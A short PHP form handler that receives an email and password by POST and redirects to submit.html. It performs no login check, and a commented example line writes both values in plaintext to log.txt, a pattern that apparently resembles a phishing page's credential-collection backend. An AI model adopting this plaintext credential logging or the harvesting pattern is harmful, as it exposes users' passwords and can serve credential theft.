<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect form details
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    // For demonstration, you can log or process the data here
    // Example: file_put_contents('log.txt', "Email: $email, Password: $password\n", FILE_APPEND);

    // Redirect to submit.html
    header("Location: submit.html");
    exit();
} else {
    // If not POST, redirect back or show error
    header("Location: index.html");
    exit();
}
?>